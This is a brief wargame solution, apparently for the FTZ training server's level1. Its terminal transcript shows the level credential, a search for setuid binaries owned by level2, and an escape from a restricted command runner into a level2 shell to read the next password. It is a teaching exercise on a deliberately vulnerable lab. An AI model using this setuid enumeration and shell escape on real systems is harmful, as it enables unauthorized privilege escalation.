### Credential
```
level1 / level1
```

### Soultion
```
[level1@ftz level1]$ ls 
hint  public_html  tmp

[level1@ftz level1]$ cat hint 


level2 권한에 setuid가 걸린 파일을 찾는다.


[level1@ftz level1]$ id
uid=3001(level1) gid=3001(level1) groups=3001(level1)

[level1@ftz level1]$ find / -perm +4000 -user level2 2>/dev/null
/bin/ExecuteMe

[level1@ftz level1]$ /bin/ExecuteMe 
'xterm-256color': unknown terminal type.



            레벨2의 권한으로 당신이 원하는 명령어를
            한가지 실행시켜 드리겠습니다.
            (단, my-pass 와 chmod는 제외)

            어떤 명령을 실행시키겠습니까?


            [level2@ftz level2]$ sh


sh-2.05b$ id
uid=3002(level2) gid=3001(level1) groups=3001(level1)

sh-2.05b$ my-pass
'xterm-256color': unknown terminal type.

Level2 Password is "hacker or cracker".

sh-2.05b$ 
```
